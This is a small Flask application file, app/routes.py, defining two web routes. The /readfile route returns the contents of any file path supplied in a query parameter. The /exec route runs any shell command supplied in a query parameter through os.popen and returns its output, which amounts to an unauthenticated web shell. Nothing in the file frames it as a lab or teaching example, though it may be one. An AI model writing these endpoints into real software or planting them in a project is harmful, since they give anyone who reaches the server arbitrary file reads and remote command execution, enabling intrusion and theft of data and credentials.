# app/routes.py
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/readfile')
def read_file():
    filename = request.args.get('file')
    with open(filename, 'r') as f:
        return f.read()

@app.route('/exec')
def run_command():
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()
